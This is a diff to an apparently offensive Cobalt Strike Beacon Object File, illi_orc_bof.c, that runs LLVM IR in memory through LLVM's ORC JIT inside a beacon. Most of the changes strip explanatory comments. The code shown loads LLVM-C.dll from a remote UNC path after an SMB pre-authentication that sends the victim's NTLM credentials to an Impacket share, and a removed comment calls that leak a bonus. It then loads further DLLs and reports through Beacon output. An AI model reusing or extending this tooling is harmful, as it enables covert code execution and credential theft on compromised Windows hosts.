@@ -2,9 +2,6 @@
  * Author: @m3rcer 
  * illi_orc_bof.c — In-process LLVM IR executor (ORC JIT / LLJIT variant)
  *
- * Uses LLJIT so printf/puts/putchar are registered as ABSOLUTE SYMBOLS in
- * the JIT dylib before the module is added.  ORC's symbol table is searched
- * first, so IR stdio calls hit our capture buffer instead of the real CRT.
  *
  * ARG PACKING  (bof_pack "cstr,bytes,cstr,cstr,cstr"):
  *   [0] dllPath  — local path to LLVM-C.dll
@@ -17,10 +14,6 @@
  *                  e.g. "arg1 arg2"  ("" = none, call as main(0,NULL))
  *                  Equivalent to lli.exe final.ll arg1 arg2
  *
- * BUILD
- *   x86_64-w64-mingw32-gcc -o illi_orc_bof.x64.o -c illi_orc_bof.c \
- *       -masm=intel -fno-builtin -Wall -Wno-unused-function \
- *       -Wno-incompatible-pointer-types
  */
 
 #include <windows.h>
@@ -65,7 +58,7 @@ typedef void *LLVMOrcSymbolStringPoolEntryRef;
 typedef void *LLVMOrcMaterializationUnitRef;
 typedef void *LLVMOrcDefinitionGeneratorRef;
 
-/* JIT symbol flags (LLVM 18: Exported=bit0, Callable=bit2) */
+/* JIT symbol flags */
 typedef struct { uint8_t GenericFlags; uint8_t TargetFlags; } LLVMJITSymbolFlags;
 #define JIT_EXPORTED_CALLABLE ((uint8_t)(0x01 | 0x04))
 
@@ -170,8 +163,6 @@ static int orc_fail(LLVMErrorRef err, const char *ctx, pfn_GEM fn_GEM, pfn_DEM f
 
 /*
  * unc_share_copy — extract \\server\share from a UNC path into out[].
- * \\server\share\subdir\file → \\server\share (null-terminated)
- * Does NOT modify the original path string.
  */
 static void unc_share_copy(const char *path, char *out, size_t outlen) {
     size_t i = 2;                       /* skip leading \\ */
@@ -186,14 +177,6 @@ static void unc_share_copy(const char *path, char *out, size_t outlen) {
 
 /*
  * smb_preauth — call WNetAddConnection2A(\\server\share) before LoadLibraryA.
- *
- * Windows 10 v1709+ blocks anonymous access to UNC paths from LoadLibraryA
- * unless an SMB session is already established.  Calling WNetAddConnection2A
- * with the current process token (lpPassword = NULL, lpUserName = NULL)
- * triggers NTLM negotiation against the share; Impacket accepts it.
- *
- * A return value of 0 (ERROR_SUCCESS) or 85 (ERROR_ALREADY_ASSIGNED) is fine.
- * Any other value is logged but we still attempt LoadLibraryA.
  */
 static void smb_preauth(const char *dllPath) {
     char share[256];
@@ -227,9 +210,6 @@ static void smb_preauth(const char *dllPath) {
 
     /*
      * lpPassword = NULL, lpUserName = NULL:
-     *   Use the current logon token for NTLM auth.  The share on impacket
-     *   (-smb2support) will accept it and the victim's creds hit your
-     *   Impacket log as a bonus.
      */
     DWORD ret = fn_WNAC2(&nr, NULL, NULL, 0);
 
@@ -247,13 +227,6 @@ static void smb_preauth(const char *dllPath) {
 
 /*
  * load_extra_dlls — parse a comma-separated DLL list and LoadLibraryA each one.
- *
- * Equivalent to ORCJITExec.exe's --load=<dll> flag / LLVM's
- * sys::DynamicLibrary::LoadLibraryPermanently().  Loaded DLLs become visible
- * to the process symbol generator so the JIT can resolve their exports
- * (e.g. user32!MessageBoxA, ole32!CoInitialize).
- *
- * "user32.dll,ole32.dll" → LoadLibraryA("user32.dll"), LoadLibraryA("ole32.dll")
  */
 static void load_extra_dlls(const char *libs) {
     if (!libs || libs[0] == '\0') return;
@@ -309,12 +282,12 @@ void go(char *args, int argslen) {
     BeaconPrintf(CALLBACK_OUTPUT,
         "[illi_orc] loading %s  IR=%d bytes  fn=%s\n", dllPath, irLen, fnName);
 
-    /*  SMB pre-auth (UNC paths only, Win10+ anonymous block workaround)  */
+    /*  SMB pre-auth  */
     if (dllPath[0] == '\\' && dllPath[1] == '\\') {
         smb_preauth(dllPath);
     }
 
-    /*  Load LLVM-C.dll — pulls ucrtbase into the process as a side-effect  */
+    /*  Load LLVM-C.dll   */
     HMODULE hLLVM = KERNEL32$LoadLibraryA(dllPath);
     if (!hLLVM) {
         BeaconPrintf(CALLBACK_ERROR,
@@ -322,10 +295,10 @@ void go(char *args, int argslen) {
         return;
     }
 
-    /*  Load extra DLLs requested by --load (before JIT so process gen finds them)  */
+    /*  Load extra DLLs requested by --load   */
     load_extra_dlls(loadLibs);
 
-    /* vsnprintf — ntdll first, then ucrtbase (now loaded via LLVM-C.dll deps) */
+    /* vsnprintf  */
     { HMODULE h = KERNEL32$GetModuleHandleA("ntdll.dll");
       if (h) g_vsn = (pfn_vsnprintf)KERNEL32$GetProcAddress(h, "_vsnprintf"); }
     if (!g_vsn) {
